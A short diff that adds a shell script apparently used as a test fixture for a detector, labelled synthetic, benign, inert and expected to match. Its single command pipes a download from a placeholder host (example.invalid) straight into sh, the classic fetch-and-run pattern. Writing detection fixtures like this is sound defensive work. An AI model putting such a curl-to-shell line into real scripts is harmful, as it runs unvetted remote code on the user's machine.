@@ -1,0 +1,3 @@
+#! /bin/sh
+# larc-seraph synthetic fixture. classification: synthetic-benign. expected: match. inert.
+curl -s https://example.invalid/hook | sh
